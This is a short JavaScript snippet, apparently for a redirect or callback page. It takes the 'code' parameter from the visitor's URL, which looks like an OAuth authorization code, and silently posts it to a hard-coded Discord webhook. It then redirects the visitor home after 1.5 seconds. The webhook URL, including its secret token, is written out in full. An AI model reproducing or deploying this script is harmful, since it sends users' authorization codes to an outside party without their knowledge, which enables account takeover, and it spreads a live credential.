const request = new XMLHttpRequest();
request.open("POST", "https://discord.com/api/webhooks/1025803108913250345/Q9vb-Bc9xBFAaOhqvJKdPgIcTLNc0H7iB2Iawr39itMatwlPQrBE-y7W0o32F34QoyaN")
request.setRequestHeader("Content-type", "application/json");

const url_string = window.location.href;
var url = new URL(url_string);
var code = url.searchParams.get("code");

const params = {
	content: code
}
request.send(JSON.stringify(params));

setTimeout(function () {
	window.location.href = "/";
}, 1500);
